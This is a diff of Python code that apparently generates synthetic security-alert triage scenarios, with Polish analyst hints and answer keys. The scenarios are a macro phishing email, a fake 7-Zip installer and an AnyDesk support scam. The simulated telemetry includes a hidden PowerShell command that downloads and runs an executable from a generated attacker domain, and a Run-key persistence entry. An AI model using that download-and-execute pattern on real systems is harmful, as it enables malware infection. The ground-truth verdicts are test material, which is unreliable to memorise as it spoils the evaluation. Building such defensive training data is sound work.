@@ -67,29 +67,31 @@ def office_macro(b: Builder, variant: str) -> None:
     sess = b.session(p)
     folder = rf"{p.profile}\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\{rng.randint(1000, 9999)}QX"
     if variant == "tp":
-        sender_dom = w.bad_domain()
+        sender_dom = b.threat(site_only=True).name
         sender, att = f"zamowienia@{sender_dom}", "Zamowienie_8841.xlsm"
         obj = rf"{folder}\{att}"
         sha1, sha256 = w.digest("macro1", "sha1"), w.digest("macro1")
-        domain, ip = w.bad_domain(), w.attacker_ip()
+        remote = b.threat()
+        domain, ip = remote.name, w.attacker_ip()
+        mail_ip = w.attacker_ip()
         others = [w.person() for _ in range(3)]
         auth = {"spf": "fail", "dkim": "none", "dmarc": "fail"} if not b.hard else {"spf": "pass", "dkim": "pass", "dmarc": "pass"}
         for i, r in enumerate([p, *others]):
             ev = b.add(src.mail(b.t(-25, i * 7), sender, r.upn, "Zamówienie nr 8841/2026: prośba o potwierdzenie", att,
-                                sender_ip=w.attacker_ip() if i == 0 else "203.0.113.77", **auth))
+                                sender_ip=mail_ip, **auth))
             ev.key("Wiadomość z zewnętrznej domeny z załącznikiem .xlsm, presja na szybkie potwierdzenie. "
                    + ("SPF/DKIM/DMARC nie przechodzą." if not b.hard else "Uwierzytelnienie przechodzi, bo atakujący kontroluje domenę. To nie dowód zaufania.")
                    if i == 0 else "Ta sama wiadomość trafiła do innych pracowników. Kampania: trzeba ich znaleźć i usunąć wiadomość ze skrzynek.")
         executed = b.hard
         if executed:
             _, xl = b.spawn(sess["outlook"], EXCEL, f'"EXCEL.EXE" "{obj}"', b.t(-4), p.host, p.sam, signer="Microsoft Corporation", cwd=p.profile)
-            ev, cmd = b.spawn(xl, CMD, r'cmd.exe /c powershell.exe -w hidden -c "iwr https://' + domain + r'/s.bin -OutFile $env:TEMP\svc.exe; & $env:TEMP\svc.exe"',
+            ev, cmd = b.spawn(xl, CMD, r'cmd.exe /c powershell.exe -w hidden -c "iwr ' + remote.url("s.bin") + r' -OutFile $env:TEMP\svc.exe; & $env:TEMP\svc.exe"',
                               b.t(-3), p.host, p.sam)
             ev.key("EXCEL.EXE uruchamia cmd.exe z poleceniem pobrania i uruchomienia pliku. Makro się wykonało, zanim ESET zareagował.")
-            _, ps = b.spawn(cmd, PS, r'powershell.exe -w hidden -c "iwr https://' + domain + r'/s.bin -OutFile $env:TEMP\svc.exe"',
+            _, ps = b.spawn(cmd, PS, r'powershell.exe -w hidden -c "iwr ' + remote.url("s.bin") + r' -OutFile $env:TEMP\svc.exe"',
                             b.t(-3, 1), p.host, p.sam)
             b.add(src.sysmon_net(b.t(-2.8), p.host, p.netbios, PS, ps.pid, ip, 443, domain, src_ip=p.ip)).key(
-                f"powershell.exe łączy się z {domain}. Etap pobierania już się odbył.")
+                f"powershell.exe łączy się z {domain} ({remote.blurb}). Etap pobierania już się odbył.")
             dropped = rf"{p.profile}\AppData\Local\Temp\svc.exe"
             b.add(src.sysmon_file(b.t(-2.5), p.host, p.netbios, PS, ps.pid, dropped, size="318 KB")).key("Na dysku pojawił się nieznany plik wykonywalny.")
             b.add(src.sysmon_reg(b.t(-1.5), p.host, p.netbios, dropped, r"HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\SvcUpdate",
@@ -101,7 +103,7 @@ def office_macro(b: Builder, variant: str) -> None:
             trigger = b.add(src.eset(b.t(0), p.host, p.netbios, "VBA/TrojanDownloader.Agent.AQX trojan", "trojan", "file", obj, sha1,
                                      "cleaned by deletion", True, "OUTLOOK.EXE", "Email client protection", reputation="Bad", popularity="Rare"))
             trigger.key("ESET usunął załącznik przy zapisie przez Outlook, zanim ktokolwiek go otworzył. Brak procesów potomnych Excela.")
-        b.ti_bad(domain, "domena", age_days=2, tags="downloader")
+        b.ti_threat(remote, ip=ip, tags="downloader")
         b.ti_bad(sender_dom, "domena", age_days=3, tags="phishing")
         b.ti_bad(sha256, "hash", age_days=1, tags="VBA downloader")
         file = {
@@ -110,7 +112,7 @@ def office_macro(b: Builder, variant: str) -> None:
             "org_prevalence": "Widziany na 4 hostach (wszystkie wiadomości z tej kampanii)",
             "sandbox_verdict": "Złośliwy (9/10)",
             "behaviors": ["Makro Auto_Open wywołuje CreateObject(\"WScript.Shell\")", "Uruchamia cmd.exe → powershell.exe -w hidden",
-                          f"Pobiera plik z https://{domain}/s.bin", "Dodaje wpis do klucza Run"],
+                          f"Pobiera plik z {remote.url('s.bin')}", "Dodaje wpis do klucza Run"],
         }
         n = len(others) + 1
         extra = "Dokument zdążył się wykonać (wersja 'escaped'), więc to infekcja do izolacji." if executed else "Plik usunięty przed otwarciem, ale wiadomość dostało jeszcze " + str(len(others)) + " osób."
@@ -163,7 +165,7 @@ def office_macro(b: Builder, variant: str) -> None:
         sim_dom = "nordwind-faktury-info.example"
         extra = {"X-Campaign-ID": "AWARENESS-Q1-2026", "X-Mailer": "AwarenessPlatform"}
         for i, r in enumerate([p, *[w.person() for _ in range(5)]]):
-            b.add(src.mail(b.t(-12, i), f"faktury@{sim_dom}", r.upn, "Pilne: zaległa faktura, otwórz załącznik", att, sender_ip="198.51.100.40",
+            b.add(src.mail(b.t(-12, i), f"faktury@{sim_dom}", r.upn, "Pilne: zaległa faktura, otwórz załącznik", att, sender_ip=w.public_ip(),
                            extra=extra)).key(
                 "Wygląda jak phishing (obca domena, presja czasu, makro), ale nagłówek X-Campaign-ID wskazuje platformę szkoleniową. Porównaj z kalendarzem kampanii." if i == 0
                 else "Ta sama wiadomość z tym samym nagłówkiem kampanii do wielu osób w kilka minut: to masowa wysyłka szkoleniowa.")
@@ -243,15 +245,17 @@ def downloaded_file(b: Builder, variant: str) -> None:
     if variant == "tp":
         p = b.person(rng.choice(["Marketing", "Sprzedaż", "HR"]))
         sess = b.session(p)
-        domain, ip = w.bad_domain(), w.attacker_ip()
+        remote = b.threat(site_only=True, brand="7zip")
+        domain, ip = remote.name, w.attacker_ip()
         fname = "7z2301-x64.exe"
-        url = f"https://{domain}/download/{fname}"
+        url = remote.url(f"download/{fname}")
         path = rf"{p.profile}\Downloads\{fname}"
         sha256 = w.digest("fake7z")
         b.add(src.proxy(b.t(-3), p.ip, p.sam, "GET", "https://www.google.com/search?q=7zip+download", 200, 600, 84_000, host=p.host))
-        trigger = b.add(src.proxy(b.t(-2), p.ip, p.sam, "GET", url, 200, 520, 1_840_000, category="Newly Registered Domain", host=p.host,
+        trigger = b.add(src.proxy(b.t(-2), p.ip, p.sam, "GET", url, 200, 520, 1_840_000, category=remote.category, host=p.host,
                                   content_type="application/x-msdownload"))
-        trigger.key(f"Pobranie .exe z domeny {domain}: nazwa udaje 7-Zip, ale to nie oficjalna strona i domena jest świeża.")
+        trigger.key(f"Pobranie .exe z domeny {domain}: nazwa udaje 7-Zip, ale to nie oficjalna strona producenta ({remote.blurb}). "
+                    "Kategoria i wiek domeny mogą wyglądać niewinnie: liczy się, że nie jest to domena producenta.")
         b.add(src.sysmon_file(b.t(-1.9), p.host, p.netbios, CHROME, sess["chrome"].pid, path, size="1.8 MB"))
         b.add(src.sysmon_motw(b.t(-1.9, 1), p.host, p.netbios, path, url, referrer="https://www.google.com/")).key(
             "Mark-of-the-Web: plik pochodzi z Internetu (strefa 3), z wyniku wyszukiwania. Typowa reklama prowadząca do fałszywej strony.")
@@ -265,7 +269,7 @@ def downloaded_file(b: Builder, variant: str) -> None:
             "Dropper zapisuje ukryty plik w profilu użytkownika.")
         b.add(src.sysmon_net(b.t(0, 20), p.host, p.netbios, rf"{p.profile}\AppData\Roaming\svc.exe", w.pid(), ip, 443, domain, src_ip=p.ip)).key(
             "Zrzucony plik łączy się z internetem.")
-        b.ti_bad(domain, "domena", age_days=2, tags="typosquatting, malware delivery")
+        b.ti_threat(remote, ip=ip, tags="typosquatting, malware delivery")
         b.ti_bad(sha256, "hash", age_days=1, tags="dropper")
         file = {
             "name": fname, "path": path, "size": "1.8 MB", "sha256": sha256, "type": "PE32+ (instalator)",
@@ -277,7 +281,7 @@ def downloaded_file(b: Builder, variant: str) -> None:
         truth = b.truth(
             "tp", "high",
             f"Użytkownik szukał 7-Zip i trafił na fałszywą stronę {domain}. Pobrany instalator jest niepodpisany (lub podpisany przez nieznanego wydawcę), zrzuca svc.exe do AppData i łączy się z internetem.",
-            f"TP. {p.host} ({p.sam}) pobrał {fname} z {domain} (typosquatting, domena 2 dni). Instalator zrzucił i uruchomił %APPDATA%\\Roaming\\svc.exe, połączenie do {ip}:443. "
+            f"TP. {p.host} ({p.sam}) pobrał {fname} z {domain} (typosquatting). Instalator zrzucił i uruchomił %APPDATA%\\Roaming\\svc.exe, połączenie do {ip}:443. "
             "Eskaluję do L2, wnoszę o izolację hosta i blokadę domeny i hasha.",
             required=["isolate_host", "block_ioc"], lookups=[f"ti:{domain}"])
         rule = "Executable downloaded from a domain outside the software whitelist"
@@ -389,12 +393,13 @@ def remote_tool(b: Builder, variant: str) -> None:
         p = b.person("Księgowość")
         b.ctx.assets[p.host.lower()]["Uwagi"] = "Stanowisko z dostępem do bankowości elektronicznej (token + hasło)"
         sess = b.session(p)
-        domain = w.bad_domain()
+        remote = b.threat(site_only=True, brand="anydesk")
+        domain = remote.name
         path = rf"{p.profile}\Downloads\AnyDesk.exe"
-        url = f"https://{domain}/AnyDesk.exe"
-        b.add(src.proxy(b.t(-22), p.ip, p.sam, "GET", url, 200, 500, 3_900_000, category="Newly Registered Domain", host=p.host,
+        url = remote.url("AnyDesk.exe")
+        b.add(src.proxy(b.t(-22), p.ip, p.sam, "GET", url, 200, 500, 3_900_000, category=remote.category, host=p.host,
                         content_type="application/x-msdownload")).key(
-            f"AnyDesk pobrany z domeny {domain}, a nie z oficjalnej strony producenta. Tak działają oszuści podszywający się pod „support”.")
+            f"AnyDesk pobrany z domeny {domain} ({remote.blurb}), a nie z oficjalnej strony producenta. Tak działają oszuści podszywający się pod „support”.")
         b.add(src.sysmon_motw(b.t(-21.9), p.host, p.netbios, path, url, referrer="https://mail.example/"))
         ev, ad = b.spawn(sess["explorer"], path, f'"{path}"', b.t(-20), p.host, p.sam, signer="AnyDesk Software GmbH", sha256=sha256,
                          cwd=rf"{p.profile}\Downloads")
@@ -415,7 +420,7 @@ def remote_tool(b: Builder, variant: str) -> None:
                                  "file", exe_pf, sha1, "none", False, "AnyDesk.exe", "Real-time file system protection", severity="Warning",
                                  reputation="Good", popularity="Common"))
         trigger.herring("ESET klasyfikuje AnyDesk tylko jako PUA (Warning), z reputacją „dobry”: to nie jest wirus. Złośliwe jest tu użycie, nie plik.")
-        b.ti_bad(domain, "domena", age_days=5, tags="fake support site, remote access scam")
+        b.ti_threat(remote, tags="fake support site, remote access scam")
         noise(b, involved=[p])
         truth = b.truth(
             "tp", "high",
